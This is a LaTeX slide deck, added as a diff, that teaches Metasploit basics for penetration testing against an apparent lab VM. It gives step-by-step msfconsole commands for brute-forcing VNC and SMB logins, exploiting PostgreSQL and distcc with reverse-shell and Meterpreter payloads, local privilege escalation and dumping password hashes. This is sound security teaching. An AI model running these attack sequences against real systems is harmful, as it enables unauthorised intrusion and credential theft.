@@ -1,0 +1,405 @@
+\documentclass[aspectratio=169]{beamer}
+\usepackage{textcomp}
+
+\title{Metasploit 101}
+\author{Santiago Gimenez Ocano}
+\date{}
+
+\begin{document}
+\frame{\titlepage}
+
+\begin{frame}
+\frametitle{Introduction to Penetration Testing}
+A penetration test has the following steps\footnote{\texttt{http://www.pentest-standard.org}. (Yes, it is \texttt{http}. Yikes!)}:
+
+\begin{itemize}
+    \item Pre-engagement Interactions
+    \item Intelligence Gathering
+    \item Threat Modeling
+    \item Vulnerability Analysis
+    \item Exploitation
+    \item Post Exploitation
+    \item Reporting
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Metasploit Framework vs. Nmap}
+
+\begin{itemize}
+    \item Metasploit is a framework that automate repetitive tasks in the pentest steps
+    \item Normally, when we talk about Metasploit we refer to a subproject called console. \\
+\end{itemize}
+
+\vspace{10pt}
+
+\textbf{Metasploit vs Nmap} 
+\begin{itemize}
+    \item Nmap focuses on Intelligence Gathering, with a bit of Vulnerability Analysis and Exploitation through its scripts.
+    \item Metasploit focuses on Exploitation and post exploitation, with a minor emphasis on Intelligence Gathering.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Terminology}
+
+\begin{description}
+    \item[Exploit] the way by which a pentests take advantage of a vulnerability.
+    \item[Payload] the code we want the target system to execute.
+    \item[Shellcode] set of instructions used as payload. Generally in asembly.
+    \item[Module] a piece of software that can be used by Metasploit.
+    \item[Listener] a component within Metasploit that waits for an incomming connection.
+\end{description}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Framework Components}
+We will focus on two tools: 
+
+\begin{description}
+    \item[Console] interactive tool to access all the modules.
+    \item[Meterpreter] shellcode that provides post-exploitation commands.
+\end{description}
+
+\vspace{10pt}
+Other tools worth exploring are:
+
+\begin{description}
+    \item[CLI] access the different modules of Metasploit from the command line.
+    \item[Venom] shellcode generator.
+\end{description}
+
+\end{frame}
+
+\begin{frame}
+
+\frametitle{Using The Console}
+
+\begin{enumerate}
+    \item Before, start the \texttt{psql} server:\\
+    \indent\texttt{\# service postgresql start \&\& msfdb init}\\
+    \item Start the console:\\
+    \indent\texttt{\# msfconsole}\\
+    \item Access the help menu: \\
+    \indent\texttt{msf5 > help}
+\end{enumerate}
+
+\end{frame}
+
+\begin{frame}
+
+\frametitle{Intelligence Gathering}
+
+Information gethering can be either:
+\begin{description}
+    \item[Passive] without sending any message to the target.
+    \item[Active] sending messages to the target.
+\end{description}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Passive Intelligence Gathering}
+
+Whois
+
+\indent\texttt{msf5 > whois <domain>|<ip\char`\_address>} \\
+
+\vspace{10pt}
+
+For example:\\
+
+\indent\texttt{msf5 > whois www.google.com}\\
+\indent\texttt{msf5 > whois 8.8.8.8}\\
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Active Intelligence Gathering - Portscanning (1/3)}
+
+This is done using modules
+
+\begin{enumerate}
+    \item Find the module: \\
+    \texttt{msf5 > search <string>}
+    \item Select the module (we can use the tab key to autocomplete the name): \\
+    \texttt{msf5 > use <module>} 
+    \item Display the module's options: \\
+    \texttt{msf5 > show options}
+    \item Configure a module option:\\
+    \texttt{msf5 > set <option\char`\_name> <value>}
+    \item Execute the module: \\
+    \texttt{msf5 > exploit} or \texttt{msf5 > run}
+    \item Show the hosts added to Metasploit's db or the ones identified in a scan: \\
+    \texttt{msf5 > hosts <options>}
+    \item Leave the current module: \\
+    \texttt{msf5 > back}
+\end{enumerate}
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Active Intelligence Gathering - Portscanning (2/3)}
+
+\begin{enumerate}
+    \item \texttt{msf5 > search portscan}
+    \item \texttt{msf5 > use auxiliary/scanner/portscan/syn}
+    \item \texttt{msf5 > show options}
+    \item \texttt{msf5 > set RHOSTS 192.168.56.101} (After we have a list of hosts we can use \texttt{msf5 > hosts -R} to setup the target hosts in each module)
+    \item \texttt{msf5 > set INTERFACE vboxnet0}
+    \item \texttt{msf5 > run}
+    \item (optional) \texttt{msf5 > hosts}
+    \item \texttt{msf5 > back}
+\end{enumerate}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Active Intelligence Gathering - Porstscanning (3/3)}
+
+We can use \texttt{nmap} within Metasploit
+
+\indent\texttt{msf5 > nmap -p- 192.168.56.101}\\
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Active Intelligence Gathering - Targeted Scannings}
+
+\begin{itemize}
+    \item Find the MySQL version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/mysql/mysql\char`\_version}
+    \item Find the SSH version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/ssh/ssh\char`\_version}
+    \item Find the FTP version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/ftp/ftp\char`\_version}
+    \item Find the SMB version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/smb/smb\char`\_version}
+    \item Find the telnet version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/telnet/telnet\char`\_version}
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Active Intelligence Gathering - Vulnerability Scanning (1/2)}
+
+Goal: detect weaknesses.\\ 
+
+Single-service vulnerabilty scanners.
+
+\begin{itemize}
+    \item Validating SMB logins (bruteforce):\\
+    \indent\texttt{msf5 > use auxiliary/scanner/smb/smb\char`\_login}
+    \item Open VNC authentication:\\
+    \indent\texttt{msf5 > auxiliary/scanner/vnc/vnc\char`\_none\char`\_auth}
+    \item Open X11 Servers:\\
+    \indent\texttt{msf5 > auxiliary/scanner/x11/open\char`\_x11}
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Active Intelligence Gathering - Vulnerability Scanning (1/2)}
+
+Bruteforce passwords with auxiliary VNC module.\\
+
+\begin{enumerate}
+    \item \texttt{msf5 > auxiliary/scanner/vnc/vnc\char`\_login} \\
+    \item \texttt{msf5 > set USERNAME root} \\
+    \item \texttt{msf5 > hosts -R} \\
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+\vspace{10pt}
+\textit{NOTE: to see the whole list of auxiliary modules use \texttt{msf5 > show auxiliary}}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Exploitation (1/3)}
+
+To see the list of exploitation modules type: \\
+
+\indent\texttt{msf5 > show exploits} \\
+
+\vspace{10pt}
+\texttt{msf5 > search} becomes helpful, as we can search for any string such as service name, service achronym, CVE, MS security bulletin, or fancy vulnerabilty name (like bluekeep).
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Exploitation (2/3)}
+
+One example:
+
+\begin{enumerate}
+    \item \texttt{msf5 > use exploit/linux/postgresql/postgresql\char`\_payload}
+    \item \texttt{msf5 > show payloads}
+    \item \texttt{msf5 > set payload linux/x86/shell/reverse\char`\_tcp}
+    \item \texttt{msf5 > show options}
+    \item \texttt{msf5 > set RHOST 192.168.56.101}
+    \item \texttt{msf5 > set LHOST 192.168.56.1}
+    \item \texttt{msf5 > show targets}
+    \item \texttt{msf5 > set TARGET 0}
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+\textit{Get interactive shell with} \texttt{python -c \textquotesingle import pty; pty.spawn("/bin/bash")\textquotesingle}\\
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Exploitation (3/3)}
+
+Another example:
+
+\begin{enumerate}
+    \item \texttt{msf5 > use exploit/unix/misc/distcc\char`\_exec}
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Post Exploitation}
+
+There are three types of payloads:
+
+\begin{itemize}
+    \item Portbind: it opens a port in the target and then we can connect to such port. This is generally prevented by firewalls at the target. Generally, we obtain shell access after connecting to the target port.
+    \item Reverse shell: it open a port in our attacking system, then the target connects to our system. Generrally, we obtain shell access.
+    \item Meterpreter: it opens a port in our attacking system, then the target connects to our system. In this case we do not obtain shell access, we obtain a Meterpreter session, which includes additional commands.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Meterpreter (1/3)}
+
+Use the following commands:
+
+\begin{enumerate}
+    \item \texttt{msf5 > use exploit/linux/postgresql/postgresql\char`\_payload}
+    \item \texttt{msf5 > set payload linux/x86/meterpreter/reverse\char`\_tcp}
+    \item \texttt{msf5 > set RHOST 192.168.56.101}
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Meterpreter (1/2)}
+
+Some of the most common commands that Meterpreter has are:
+
+\begin{itemize}
+    \item List of commands:\\
+    \texttt{meterpreter > help}
+    \item Obtain shell:\\
+    \texttt{meterpreter > shell}
+    \item Get user info: \\
+    \texttt{meterpreter > getuid}
+    \item Get system info:\\
+    \texttt{meterpreter > sysinfo}
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Meterpreter (3/3)}
+
+Some of the available Meterpreter scripts are:
+
+\begin{itemize}
+    \item Check if the target is a virtual machine:\\
+    \texttt{run post/linux/gather/checkvm}
+    \item Get network configuration:\\
+    \texttt{run post/linux/gather/enum\char`\_network}
+    \item Get possible local exploits\\
+    \texttt{run post/multi/recon/local\char`\_exploit\char`\_suggester}
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Getting Admin access (1/2)}
+
+Once we obtained a session, we can execute some of the local exploits suggested by the previous script:
+
+\begin{itemize}
+    \item\texttt{meterpreter > background}
+    \item\texttt{msf5 > use exploit/linux/local/glibc\char`\_ld\char`\_audit\char`\_dso\char`\_load\char`\_priv\char`\_esc}
+    \item\texttt{msf5 > set session 8} (use right session number)
+    \item\texttt{msf5 > set LHOST 192.168.56.1}
+    \item\texttt{msf5 > run}
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Getting Admin access (2/2)}
+
+After we obtain root privileges, we can run more scripts:
+
+\begin{itemize}
+    \item Get the password hashes:\\
+    \texttt{meterpreter > run post/linux/gather/hashdump}
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Challenge}
+
+We know there is an FTP service running in port 21 at our target. Exploit this service.
+
+\begin{itemize}
+    \item Find the program name and version.
+    \item Find an exploit in Metasploit.
+    \item Configure the exploit.
+    \item Execute the exploit.
+    \item Profit.
+    \item Extra credit: If not root, get root.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{References}
+\begin{thebibliography}{9}
+
+    \bibitem{metasploit-unleashed}
+        \texttt{https://www.offensive-security.com/}\\
+        \texttt{metasploit-unleashed}
+
+    \bibitem{Metasploitable 2 Exploitability Guide}
+        \texttt{https://metasploit.help.rapid7.com/docs/}
+        \texttt{metasploitable-2-exploitability-guide}
+
+    \bibitem{Metasploitable - VNC}
+        \texttt{https://saiyanpentesting.com/metasploitable-vnc/}
+    
+    \bibitem{book}
+        Kennedy, David, et al. \textit{Metasploit: the penetration tester's guide}. No Starch Press, 2011.
+    
+    \end{thebibliography}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Extra: Analizing A Module}
+
+\begin{itemize}
+    \item Modules are written in Ruby. \\
+    \item Module for vsFTP 2.3.4\footnote{This is located at \texttt{https://github.com/rapid7/metasploit-framework/blob/master/modules/ \\exploits/unix/ftp/vsftpd\char`\_234\char`\_backdoor.rb} or at \texttt{/usr/share/ \\metasploit-framework/modules/exploits/unix/ftp/vsftpd\char`\_234\char`\_backdoor.rb} in Kali Linux} \\
+    \item Backdoor that provides unauthenticated root shell access at port 6200 after the characters \texttt{:)} are appended to any username.
+\end{itemize}
+
+\end{frame}
+
+\end{document}
